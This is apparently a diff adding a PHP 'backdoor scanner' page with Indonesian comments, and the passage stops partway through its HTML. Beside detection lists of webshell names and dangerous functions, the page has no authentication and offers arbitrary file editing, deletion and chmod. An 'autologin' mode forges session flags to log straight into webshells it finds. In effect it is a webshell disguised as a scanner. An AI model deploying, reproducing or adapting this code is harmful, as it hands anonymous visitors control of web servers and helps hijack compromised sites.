@@ -1,0 +1,1018 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+@session_start();
+
+/**
+ * Default path:
+ * - Kalau DOCUMENT_ROOT ada & valid → pakai itu
+ * - Kalau tidak → pakai folder tempat file ini berada
+ */
+$default_path = (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT']))
+    ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\')
+    : __DIR__;
+
+$path = $_GET['path'] ?? $default_path;
+$view = $_GET['view'] ?? null;
+$bpage = isset($_GET['bpage']) ? (int)$_GET['bpage'] : 1;
+$cpage = isset($_GET['cpage']) ? (int)$_GET['cpage'] : 1;
+$ppage = isset($_GET['ppage']) ? (int)$_GET['ppage'] : 1;
+if ($bpage < 1) $bpage = 1;
+if ($cpage < 1) $cpage = 1;
+if ($ppage < 1) $ppage = 1;
+$per_page = 10;
+
+// FILTER NAMA FILE
+$filter_name = $_GET['filter_name'] ?? '';
+$folder_mode = $_GET['folder_mode'] ?? 'all';
+$selected_folder = $_GET['selected_folder'] ?? '';
+
+// Fitur open single URL dengan target _blank
+if (isset($_GET['open_url']) && !empty($_GET['open_url'])) {
+    $file = $_GET['open_url'];
+    if (file_exists($file)) {
+        $url = showFileUrl($file);
+        echo "<script>window.open('$url', '_blank'); window.location.href = '" . str_replace('&open_url=' . urlencode($file), '', $_SERVER['REQUEST_URI']) . "';</script>";
+        exit;
+    }
+}
+
+/**
+ * MODE: AUTOLOGIN (session bypass + redirect ke webshell)
+ */
+if (isset($_GET['action']) && $_GET['action'] === 'autologin' && !empty($_GET['target'])) {
+    $targetFile = $_GET['target'];
+    if (file_exists($targetFile)) {
+        $sessionKeys = [
+            'logged_in', 'd5587b78418472a83b6a4b208c081080', 'auth',
+            'authenticated', 'admin', 'user_logged_in',
+        ];
+        foreach ($sessionKeys as $k) {
+            $_SESSION[$k] = true;
+        }
+        $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') : '';
+        if ($docRoot && strpos($targetFile, $docRoot) === 0) {
+            $relative = substr($targetFile, strlen($docRoot));
+        } else {
+            $relative = $targetFile;
+        }
+        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
+        $url = $scheme . $_SERVER['HTTP_HOST'] . $relative;
+        header('Location: ' . $url);
+        exit;
+    }
+    echo 'Target file tidak ditemukan';
+    exit;
+}
+
+/**
+ * WORDLIST PATTERN BACKDOOR
+ */
+function getBackdoorPatterns() {
+    return [
+        'eval', 'system', 'shell_exec', 'exec', 'passthru', 'proc_open', 
+        'popen', 'pcntl_exec', 'assert', 'create_function', 'call_user_func',
+        'call_user_func_array', 'array_map', 'array_filter', 'usort', 'uasort',
+        '\$_GET\[', '\$_POST\[', '\$_REQUEST\[', '\$_COOKIE\[', 
+        'parse_str', 'extract', 'import_request_variables',
+        '\$(GET|POST|REQUEST)\[.*\]\s*.*\s*eval\s*\(', 'goto\s+[a-zA-Z_][a-zA-Z0-9_]*\s*;',
+        'base64_decode', 'str_rot13', 'gzinflate', 'gzuncompress', 'gzdecode',
+        'file_put_contents', 'fwrite', 'curl_exec', 'fsockopen',
+        'FilesMan', 'WSO', 'r57shell', 'c99shell', 'b374k', 'IndoXploit',
+        'error_reporting\(0\)', '@ini_set', 'set_time_limit\(0\)',
+        'base64_decode.*eval', 'eval.*base64_decode',
+    ];
+}
+
+/**
+ * GOOGLEBOT CLOAKING PATTERNS
+ */
+function getGooglebotCloakingPatterns() {
+    return [
+        'Googlebot', 'googlebot', 'strpos.*Googlebot', 'stripos.*Googlebot',
+        'HTTP_USER_AGENT.*Googlebot', '$_SERVER.*Googlebot',
+        '66.249.', '209.85.', '64.233.', '72.14.',
+        'is_googlebot', 'is_bot', 'is_crawler',
+        'カジノ', 'ギャンブル', 'slot gacor', 'slot88',
+        'viagra', 'casino', 'poker',
+    ];
+}
+
+function getFolders($path) {
+    $folders = [];
+    if (!is_dir($path)) return $folders;
+    try {
+        $items = scandir($path);
+        foreach ($items as $item) {
+            $fullpath = $path . '/' . $item;
+            if ($item !== '.' && $item !== '..' && is_dir($fullpath) && is_readable($fullpath)) {
+                $folders[] = $item;
+            }
+        }
+        sort($folders);
+    } catch (Throwable $e) {}
+    return $folders;
+}
+
+/**
+ * SCAN PERMISSION / CHMOD - KHUSUS FOLDER/DIREKTORI SAJA
+ * Deteksi folder dengan permission: 555, 111, 000, 444 SAJA
+ */
+function scanDangerousPermissions($dir) {
+    $dangerous_folders = [];
+    if (!is_dir($dir) || !is_readable($dir)) return $dangerous_folders;
+    
+    // Hanya permission yang dideteksi: 555, 111, 000, 444
+    $dangerous_perms = ['555', '111', '000', '444'];
+    
+    $iterator = function($directory) use (&$iterator, &$dangerous_folders, $dangerous_perms) {
+        if (!is_readable($directory)) return;
+        try {
+            $items = @scandir($directory);
+            if ($items === false) return;
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $fullpath = $directory . DIRECTORY_SEPARATOR . $item;
+                if (is_link($fullpath)) continue;
+                
+                // HANYA PROSES FOLDER, BUKAN FILE
+                if (is_dir($fullpath)) {
+                    // Cek permission folder
+                    $perms = fileperms($fullpath);
+                    $perm_octal = substr(sprintf('%o', $perms), -4);
+                    $clean_perm = str_replace('0', '', $perm_octal);
+                    
+                    // Deteksi permission berbahaya
+                    $reason = '';
+                    $is_dangerous = false;
+                    
+                    switch ($clean_perm) {
+                        case '555':
+                            $is_dangerous = true;
+                            $reason = '🟡 MEDIUM: Folder 555 (Read+Execute only) - Tidak bisa write, mungkin script tidak jalan!';
+                            break;
+                        case '111':
+                            $is_dangerous = true;
+                            $reason = '🟡 MEDIUM: Folder 111 (Execute only) - Sangat tidak normal untuk folder!';
+                            break;
+                        case '000':
+                            $is_dangerous = true;
+                            $reason = '🔴 CRITICAL: Folder 000 (No permission) - Tidak bisa diakses sama sekali!';
+                            break;
+                        case '444':
+                            $is_dangerous = true;
+                            $reason = '🟡 MEDIUM: Folder 444 (Read only) - Tidak bisa write file ke folder ini!';
+                            break;
+                    }
+                    
+                    if ($is_dangerous) {
+                        $dangerous_folders[] = [
+                            'path' => $fullpath,
+                            'perms' => $perm_octal,
+                            'reason' => $reason,
+                            'clean_perms' => $clean_perm
+                        ];
+                    }
+                    
+                    // Rekursi ke sub folder
+                    $iterator($fullpath);
+                }
+            }
+        } catch (Throwable $e) { return; }
+    };
+    
+    try { $iterator($dir); } catch (Throwable $e) {}
+    
+    // Urutkan berdasarkan bahaya: 000, 555, 444, 111
+    usort($dangerous_folders, function($a, $b) {
+        $order = ['000' => 0, '555' => 1, '444' => 2, '111' => 3];
+        $permA = $a['clean_perms'];
+        $permB = $b['clean_perms'];
+        return ($order[$permA] ?? 6) - ($order[$permB] ?? 6);
+    });
+    return $dangerous_folders;
+}
+
+/**
+ * SCAN BACKDOOR - MANUAL RECURSIVE
+ */
+function scanBackdoorWithDetails($dir) {
+    $patterns = getBackdoorPatterns();
+    $dangerous_params = ['$_GET[', '$_POST[', '$_REQUEST[', '$_COOKIE['];
+    $backdoors = [];
+    
+    if (!is_dir($dir) || !is_readable($dir)) return $backdoors;
+    
+    $iterator = function($directory) use (&$iterator, $patterns, $dangerous_params, &$backdoors) {
+        if (!is_readable($directory)) return;
+        try {
+            $items = @scandir($directory);if ($items === false) return;
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $fullpath = $directory . DIRECTORY_SEPARATOR . $item;
+                if (is_link($fullpath)) continue;
+                if (is_dir($fullpath)) {
+                    $iterator($fullpath);
+                } elseif (is_file($fullpath) && is_readable($fullpath)) {
+                    $extension = strtolower(pathinfo($fullpath, PATHINFO_EXTENSION));
+                    $valid_extensions = ['php', 'php2', 'php3', 'php4', 'php5', 'phtml', 'inc'];
+                    if (!in_array($extension, $valid_extensions)) continue;
+                    if (filesize($fullpath) > 3 * 1024 * 1024) continue;
+                    
+                    $content = @file_get_contents($fullpath);
+                    if ($content === false || empty($content)) continue;
+                    
+                    $score = 0;
+                    $detected_items = [];
+                    
+                    foreach ($patterns as $pattern) {
+                        if (stripos($content, $pattern) !== false) {
+                            $score += 2;
+                            $detected_items[] = $pattern;
+                            break;
+                        }
+                    }
+                    foreach ($dangerous_params as $pattern) {
+                        if (stripos($content, $pattern) !== false) {
+                            $score += 3;
+                            $detected_items[] = "Parameter: $pattern";
+                            break;
+                        }
+                    }
+                    if (preg_match('/goto\s+[a-zA-Z_][a-zA-Z0-9_]*\s*;/i', $content)) {
+                        $score += 4;
+                        $detected_items[] = "Struktur GOTO";
+                    }
+                    if (preg_match('/\$(GET|POST|REQUEST|_COOKIE)\[.*\]\s*.*\s*eval\s*\(/i', $content)) {
+                        $score += 5;
+                        $detected_items[] = "⚠️ KRITIS: Parameter ke eval()";
+                    }
+                    if (preg_match('/\$(GET|POST|REQUEST|_COOKIE)\[.*\]\s*.*\s*(system|exec|shell_exec)\s*\(/i', $content)) {
+                        $score += 5;
+                        $detected_items[] = "⚠️ KRITIS: Parameter ke system()";
+                    }
+                    $shell_signatures = ['c99shell', 'r57shell', 'b374k', 'wso', 'FilesMan', 'IndoXploit'];
+                    foreach ($shell_signatures as $sig) {
+                        if (stripos($content, $sig) !== false) {
+                            $score += 5;
+                            $detected_items[] = "Signature: $sig";
+                            break;
+                        }
+                    }
+                    if (preg_match('/base64_decode.*eval|eval.*base64_decode/i', $content)) {
+                        $score += 8;
+                        $detected_items[] = "🚨 CLASSIC: base64+eval backdoor";
+                    }
+                    if ($score >= 3) {
+                        $backdoors[] = [
+                            'path' => $fullpath,
+                            'score' => $score,
+                            'reasons' => array_unique($detected_items)
+                        ];
+                    }
+                }
+            }
+        } catch (Throwable $e) { return; }
+    };
+    
+    try { $iterator($dir); } catch (Throwable $e) {}
+    usort($backdoors, function($a, $b) { return $b['score'] - $a['score']; });
+    return $backdoors;
+}
+
+/**
+ * SCAN GOOGLEBOT CLOAKING
+ */
+function scanGooglebotCloaking($dir) {
+    $patterns = getGooglebotCloakingPatterns();
+    $cloaking_files = [];
+    if (!is_dir($dir) || !is_readable($dir)) return $cloaking_files;
+    
+    $iterator = function($directory) use (&$iterator, $patterns, &$cloaking_files) {
+        if (!is_readable($directory)) return;
+        try {
+            $items = @scandir($directory);
+            if ($items === false) return;
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $fullpath = $directory . DIRECTORY_SEPARATOR . $item;
+                if (is_link($fullpath)) continue;
+                if (is_dir($fullpath)) {
+                    $iterator($fullpath);
+                } elseif (is_file($fullpath) && is_readable($fullpath)) {
+                    $extension = strtolower(pathinfo($fullpath, PATHINFO_EXTENSION));
+                    $valid_extensions = ['php', 'php2', 'php3', 'php4', 'php5', 'phtml', 'inc', 'html', 'htm'];
+                    if (!in_array($extension, $valid_extensions)) continue;
+                    if (filesize($fullpath) > 2 * 1024 * 1024) continue;
+                    $content = @file_get_contents($fullpath);
+                    if ($content === false) continue;
+                    foreach ($patterns as $pattern) {
+                        if (stripos($content, $pattern) !== false) {
+                            $cloaking_files[] = $fullpath;
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch (Throwable $e) { return; }
+    };
+    
+    try { $iterator($dir); } catch (Throwable $e) {}
+    return $cloaking_files;
+}
+
+function scanBackdoor($dir) {
+    $backdoors_data = scanBackdoorWithDetails($dir);
+    return array_column($backdoors_data, 'path');
+}
+
+function showFileContent($file) {
+    if (file_exists($file) && is_readable($file)) {
+        return htmlspecialchars(file_get_contents($file));
+    }
+    return '';
+}
+
+function showFileUrl($file) {
+    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') : '';
+    if ($docRoot && strpos($file, $docRoot) === 0) {
+        $relative_path = substr($file, strlen($docRoot));
+    } else {
+        $relative_path = $file;
+    }
+    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
+    return $scheme . $_SERVER['HTTP_HOST'] . $relative_path;
+}
+
+function getPagination($total, $per_page, $current_page, $page_param, $path, $filter_name = '', $folder_mode = '', $selected_folder = '') {
+    $total_pages = max(1, (int)ceil($total / $per_page));
+    if ($total_pages <= 1) return '';
+    $paramsBase = ['path' => $path, 'filter_name' => $filter_name, 'folder_mode' => $folder_mode, 'selected_folder' => $selected_folder];
+    $html = '<div class="btn-group btn-group-sm w-100 flex-wrap" role="group">';
+    $params = $paramsBase; $params[$page_param] = 1;
+    $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary btn-sm'>⏮</a>";
+    if ($current_page > 1) {
+        $params = $paramsBase; $params[$page_param] = $current_page - 1;
+        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary btn-sm'>←</a>";
+    }
+    $start = max(1, $current_page - 2); $end = min($total_pages, $current_page + 2);
+    for ($i = $start; $i <= $end; $i++) {
+        $params = $paramsBase; $params[$page_param] = $i;
+        $active = ($i == $current_page) ? 'btn-primary' : 'btn-outline-primary';
+        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn $active btn-sm'>$i</a>";
+    }
+    if ($current_page < $total_pages) {
+        $params = $paramsBase; $params[$page_param] = $current_page + 1;
+        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary btn-sm'>→</a>";
+    }
+    $params = $paramsBase; $params[$page_param] = $total_pages;
+    $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary btn-sm'>⏭</a>";
+    $html .= '</div>';
+    return $html;
+}
+
+// Edit file
+if (isset($_POST['edit_file'], $_POST['file_content'])) {
+    $file = $_POST['edit_file'];
+    if (file_exists($file) && is_writable($file)) {
+        if (file_put_contents($file, $_POST['file_content']) !==false) {
+            echo "<div class='alert alert-success alert-dismissible fade show m-3'><i class='fas fa-check-circle'></i> File berhasil disimpan!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+        } else {
+            echo "<div class='alert alert-danger alert-dismissible fade show m-3'><i class='fas fa-exclamation-triangle'></i> Gagal menyimpan file!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+        }
+    } else {
+        echo "<div class='alert alert-danger alert-dismissible fade show m-3'><i class='fas fa-exclamation-triangle'></i> File tidak ditemukan atau tidak bisa diubah!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+    }
+}
+
+// Delete file
+if (isset($_POST['delete_file'])) {
+    $file = $_POST['delete_file'];
+    if (file_exists($file) && is_writable($file)) {
+        if (unlink($file)) {
+            echo "<div class='alert alert-success alert-dismissible fade show m-3'><i class='fas fa-check-circle'></i> File berhasil dihapus!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+            $view = null;
+        } else {
+            echo "<div class='alert alert-danger alert-dismissible fade show m-3'><i class='fas fa-exclamation-triangle'></i> Gagal menghapus file!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+        }
+    } else {
+        echo "<div class='alert alert-danger alert-dismissible fade show m-3'><i class='fas fa-exclamation-triangle'></i> File tidak ditemukan atau tidak bisa dihapus!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+    }
+}
+
+// Chmod folder
+if (isset($_POST['chmod_folder']) && isset($_POST['new_perms'])) {
+    $folder = $_POST['chmod_folder'];
+    $new_perms = octdec($_POST['new_perms']);
+    if (is_dir($folder) && is_writable($folder)) {
+        if (chmod($folder, $new_perms)) {
+            echo "<div class='alert alert-success alert-dismissible fade show m-3'><i class='fas fa-check-circle'></i> Folder permission changed to " . decoct($new_perms) . "!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+        } else {
+            echo "<div class='alert alert-danger alert-dismissible fade show m-3'><i class='fas fa-exclamation-triangle'></i> Gagal mengubah permission folder!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+        }
+    } else {
+        echo "<div class='alert alert-danger alert-dismissible fade show m-3'><i class='fas fa-exclamation-triangle'></i> Folder tidak ditemukan atau tidak bisa diubah!<button type='button' class='btn-close' data-bs-dismiss='alert'></button></div>";
+    }
+}
+
+// Jalankan scan
+$scan_path = $path;
+if ($folder_mode === 'perscript' && !empty($view)) {
+    $scan_path = dirname($view);
+} elseif ($folder_mode === 'per_page' && !empty($selected_folder)) {
+    $scan_path = $path . '/' . $selected_folder;
+}
+
+$backdoors_data = is_dir($scan_path) ? scanBackdoorWithDetails($scan_path) : [];
+$backdoors = array_column($backdoors_data, 'path');
+$googlebot_files = is_dir($scan_path) ? scanGooglebotCloaking($scan_path) : [];
+$dangerous_perms = is_dir($scan_path) ? scanDangerousPermissions($scan_path) : [];
+
+if ($filter_name !== '') {
+    $backdoors_data = array_filter($backdoors_data, function($item) use ($filter_name) {
+        return stripos(basename($item['path']), $filter_name) !== false;
+    });
+    $googlebot_files = array_filter($googlebot_files, function($file) use ($filter_name) {
+        return stripos(basename($file), $filter_name) !== false;
+    });
+    $dangerous_perms = array_filter($dangerous_perms, function($item) use ($filter_name) {
+        return stripos(basename($item['path']), $filter_name) !== false;
+    });
+}
+
+$backdoors_data = array_values($backdoors_data);
+$googlebot_files = array_values($googlebot_files);
+$dangerous_perms = array_values($dangerous_perms);
+
+$folders = getFolders($path);
+$bpage = isset($_GET['bpage']) ? max(1, (int)$_GET['bpage']) : 1;
+$cpage = isset($_GET['cpage']) ? max(1, (int)$_GET['cpage']) : 1;
+$ppage = isset($_GET['ppage']) ? max(1, (int)$_GET['ppage']) : 1;
+
+$total_backdoors = count($backdoors_data);
+$offset_backdoor = ($bpage - 1) * $per_page;
+$page_backdoors_data = array_slice($backdoors_data, $offset_backdoor, $per_page);
+
+$total_googlebot = count($googlebot_files);
+$offset_googlebot = ($cpage - 1) * $per_page;
+$page_googlebot_files = array_slice($googlebot_files, $offset_googlebot, $per_page);
+
+$total_perms = count($dangerous_perms);
+$offset_perms = ($ppage - 1) * $per_page;
+$page_perms_data = array_slice($dangerous_perms, $offset_perms, $per_page);
+
+function getRiskClass($score) {
+    if ($score >= 8) return 'risk-high';
+    if ($score >= 5) return 'risk-medium';
+    return 'risk-low';
+}
+
+function getPermClass($perms) {
+    $clean_perms = str_replace('0', '', $perms);
+    if ($clean_perms == '000') return 'perm-critical';
+    if ($clean_perms == '555' || $clean_perms == '444' || $clean_perms == '111') return 'perm-medium';
+    return '';
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scanner Backdoor Pro | Deteksi Parameter, GOTO & CHMOD Folder</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
+            padding: 20px;
+        }
+        .main-container { max-width: 1600px; margin: 0 auto; }
+        .card {
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border: none;
+            transition: transform 0.2s ease;
+            height: 100%;
+        }
+        .card:hover { transform: translateY(-3px); }
+        .card-header {
+            border-radius: 20px 20px 0 0 !important;
+            padding: 15px 20px;
+            font-weight: 600;
+        }
+        .card-header.bg-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) !important; }
+        .card-header.bg-danger { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%) !important; }
+        .card-header.bg-warning { background: linear-gradient(135deg, #fa709a 0%, #fee140 100%) !important; }
+        .card-header.bg-info { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%) !important; }
+        .card-header.bg-dark { background: linear-gradient(135deg, #434343 0%, #000000 100%) !important; }
+        .card-header.bg-secondary { background: linear-gradient(135deg, #434343 0%, #000000 100%) !important; }
+        
+        .risk-high { border-left: 4px solid #e74c3c !important; background: linear-gradient(90deg, #fff5f5 0%, #fff 100%); }
+        .risk-medium { border-left: 4px solid #f39c12 !important; }
+        .risk-low { border-left: 4px solid #3498db !important; }
+        
+        .perm-critical { border-left: 4px solid #e74c3c !important; background: linear-gradient(90deg, #fff0f0 0%, #fff 100%); }
+        .perm-medium { border-left: 4px solid #f1c40f !important; background: linear-gradient(90deg, #fffbf0 0%, #fff 100%); }
+        
+        .list-group-item {
+            cursor: pointer;
+            font-size: 0.85rem;
+            border-radius: 10px !important;
+            margin-bottom: 5px;
+            border: 1px solid rgba(0,0,0,0.05);
+            transition: all 0.2s ease;
+        }
+        .list-group-item:hover { transform: translateX(5px); background-color: #f8f9fa; }
+        
+        .badge-score {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+            color: white;
+        }
+        .badge-perm {
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+            color: white;
+        }
+        .badge-perm-000 { background: linear-gradient(135deg, #555, #333); }
+        .badge-perm-555, .badge-perm-444, .badge-perm-111 { background: linear-gradient(135deg, #f1c40f, #f39c12); color: #000; }
+        .badge-reason {
+            background: #f39c12;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 9px;
+            margin-left: 5px;
+            color: #000;
+        }
+        
+        #edit-content {
+            width: 100%;
+            min-height: 450px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            background: #1e1e2e;
+            color: #e0e0e0;
+            padding: 15px;
+            border-radius: 12px;
+        }
+        .textarea-editable { background: #2d2d3f !important; }
+        
+        .url-box {
+            font-family: monospace;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px;
+            border-radius: 12px;
+            word-break: break-all;
+            font-size: 11px;
+        }
+        
+        .scrollable-list {
+            max-height: 320px;
+            overflow-y: auto;
+            padding-right: 5px;
+        }
+        .stat-badge {
+            background: rgba(255,255,255,0.2);
+            padding: 4px 10px;
+            border-radius: 30px;
+            font-size: 11px;
+        }
+        .pagination-container {
+            background: rgba(0,0,0,0.03);
+            border-radius: 12px;
+            padding: 10px;
+            margin-top: 10px;
+        }
+        .btn-open-sm {
+            padding: 2px 8px;
+            font-size: 11px;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .card { animation: fadeIn 0.3s ease-out; }
+        .form-check-input { cursor: pointer; }
+        .form-check-label { cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="container-fluid main-container">
+    <div class="row g-3 mb-4">
+        <!-- Kolom 1: Path Scanner -->
+        <div class="col-12 col-md-3">
+            <div class="card">
+                <div class="card-header bg-primary text-white">
+                    <h5 class="card-title mb-0"><i class="fas fa-folder-tree me-2"></i>Path Scanner</h5>
+                </div>
+                <div class="card-body">
+                    <form method="get">
+                        <div class="mb-3">
+                            <label class="form-label small fw-bold">Target Directory</label>
+                            <input type="text" class="form-control form-control-sm" name="path" value="<?= htmlspecialchars($path ?? '') ?>">
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label small fw-bold">Filter Filename</label>
+                            <input type="text" class="form-control form-control-sm" name="filter_name" value="<?= htmlspecialchars($filter_name ?? '') ?>" placeholder="index.php">
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label small fw-bold">Folder Mode</label>
+                            <select name="folder_mode" class="form-select form-select-sm">
+                                <option value="all" <?= ($folder_mode ?? '') === 'all' ? 'selected' : '' ?>>All Directories</option>
+                                <option value="per_page" <?= ($folder_mode ?? '') === 'per_page' ? 'selected' : '' ?>>Per Page</option>
+                                <option value="perscript" <?= ($folder_mode ?? '') === 'perscript' ? 'selected' : '' ?>>Per Script</option>
+                            </select>
+                        </div>
+                        <?php if (($folder_mode ?? '') === 'per_page'): ?>
+                        <div class="mb-3">
+                            <select name="selected_folder" class="form-select form-select-sm">
+                                <option value="">-- Pilih Folder --</option>
+                                <?php foreach (($folders ?? []) as $folder): ?>
+                                <option value="<?= htmlspecialchars($folder) ?>" <?= ($selected_folder ?? '') === $folder ? 'selected' : '' ?>><?= htmlspecialchars($folder) ?></option>
+                                <?php endforeach; ?>
+                            </select>
+                        </div>
+                        <?php endif; ?>
+                        <button type="submit" class="btn btn-primary w-100 btn-sm"><i class="fas fa-search me-2"></i>Scan</button>
+                    </form>
+                    <div class="mt-3 p-2 bg-light rounded small">
+                        <i class="fas fa-shield-alt text-primary me-1"></i>
+                        Deteksi: Parameter GET/POST, GOTO, Encoder, WebShell, CHMOD Folder
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Kolom 2: Backdoor Results -->
+        <div class="col-12 col-md-3">
+            <div class="card">
+                <div class="card-header bg-danger text-white d-flex justify-content-between align-items-center">
+                    <h5 class="card-title mb-0"><i class="fas fa-skull me-2"></i>Backdoor</h5>
+                    <span class="stat-badge"><?= number_format($total_backdoors) ?> files | Pg <?= $bpage ?></span>
+                </div>
+                <div class="card-body p-2">
+                    <?php if (!empty($page_backdoors_data)): ?>
+                        <div class="btn-group w-100 mb-2">
+                            <button type="button" class="btn btn-warning btn-sm" onclick="selectAllBackdoor()">
+                                <i class="fas fa-check-double me-1"></i>Select All
+                            </button>
+                            <button type="button" class="btn btn-outline-warning btn-sm" onclick="unselectAllBackdoor()">
+                                <i class="fas fa-times me-1"></i>Unselect
+                            </button>
+                            <button type="button" class="btn btn-success btn-sm" onclick="openSelectedBackdoor()">
+                                <i class="fas fa-external-link-alt me-1"></i>Open (<span id="selectedCountBackdoor">0</span>)
+                            </button>
+                        </div>
+                        <div class="scrollable-list" id="backdoorList">
+                            <?php foreach ($page_backdoors_data as $item):
+                                $file = $item['path'];
+                                $score = $item['score'];
+                                $reasons = $item['reasons'];
+                                $risk_class = getRiskClass($score);$view_link = "?path=" . urlencode($path ?? '') .
+                                    "&bpage=" . urlencode($bpage) .
+                                    "&filter_name=" . urlencode($filter_name ?? '') .
+                                    "&folder_mode=" . urlencode($folder_mode ?? '') .
+                                    "&selected_folder=" . urlencode($selected_folder ?? '') .
+                                    "&view=" . urlencode($file);
+                                $file_url = showFileUrl($file);
+                            ?>
+                            <div class="list-group-item list-group-item-danger <?= $risk_class ?>">
+                                <div class="d-flex justify-content-between align-items-start">
+                                    <div class="form-check">
+                                        <input type="checkbox" class="form-check-input backdoor-checkbox" value="<?= htmlspecialchars($file) ?>" id="cb_<?= md5($file) ?>" data-url="<?= htmlspecialchars($file_url) ?>">
+                                        <label class="form-check-label" for="cb_<?= md5($file) ?>">
+                                            <a href="<?= $view_link ?>" class="text-danger text-decoration-none">
+                                                <i class="fas fa-file-code me-1"></i>
+                                                <strong><?= htmlspecialchars(basename($file)) ?></strong>
+                                            </a>
+                                        </label>
+                                    </div>
+                                    <div>
+                                        <button type="button" class="btn btn-sm btn-outline-success me-1 btn-open-sm" onclick="openSingleUrl('<?= htmlspecialchars($file_url) ?>')" title="Open in new tab">
+                                            <i class="fas fa-external-link-alt"></i>
+                                        </button>
+                                        <span class="badge-score">⚠️ <?= $score ?></span>
+                                    </div>
+                                </div>
+                                <div class="mt-1 ms-4">
+                                    <?php foreach (array_slice($reasons, 0, 2) as $reason): ?>
+                                        <span class="badge-reason"><?= htmlspecialchars($reason) ?></span>
+                                    <?php endforeach; ?>
+                                    <?php if (count($reasons) > 2): ?>
+                                        <span class="badge-reason">+<?= count($reasons) - 2 ?> more</span>
+                                    <?php endif; ?>
+                                </div>
+                                <small class="text-muted d-block mt-1 ms-4" style="font-size: 9px;"><?= htmlspecialchars($file) ?></small>
+                            </div>
+                            <?php endforeach; ?>
+                        </div>
+                    <?php else: ?>
+                        <div class="list-group-item text-success bg-light text-center">
+                            <i class="fas fa-shield-alt fa-2x mb-2 d-block"></i>
+                            <strong>CLEAN</strong>
+                        </div>
+                    <?php endif; ?>
+                    
+                    <?php if ($total_backdoors > $per_page): ?>
+                    <div class="pagination-container mt-2">
+                        <?= getPagination($total_backdoors, $per_page, $bpage, 'bpage', $path, $filter_name, $folder_mode, $selected_folder ?? '') ?>
+                    </div>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+
+        <!-- Kolom 3: Googlebot Cloaking -->
+        <div class="col-12 col-md-3">
+            <div class="card">
+                <div class="card-header bg-warning text-dark d-flex justify-content-between align-items-center">
+                    <h5 class="card-title mb-0"><i class="fas fa-robot me-2"></i>Cloaking</h5>
+                    <span class="stat-badge bg-dark text-white"><?= number_format($total_googlebot) ?> files | Pg <?= $cpage ?></span>
+                </div>
+                <div class="card-body p-2">
+                    <div class="scrollable-list">
+                        <?php if (!empty($page_googlebot_files)): ?>
+                            <?php foreach ($page_googlebot_files as $file):
+                                $view_link = "?path=" . urlencode($path ?? '') .
+                                    "&cpage=" . urlencode($cpage) .
+                                    "&filter_name=" . urlencode($filter_name ?? '') .
+                                    "&folder_mode=" . urlencode($folder_mode ?? '') .
+                                    "&selected_folder=" . urlencode($selected_folder ?? '') .
+                                    "&view=" . urlencode($file);
+                                $file_url = showFileUrl($file);
+                            ?>
+                            <div class="list-group-item list-group-item-warning">
+                                <div class="d-flex justify-content-between align-items-center">
+                                    <div>
+                                        <a href="<?= $view_link ?>" class="text-dark text-decoration-none">
+                                            <i class="fas fa-robot me-2"></i>
+                                            <strong><?= htmlspecialchars(basename($file)) ?></strong>
+                                        </a>
+                                    </div>
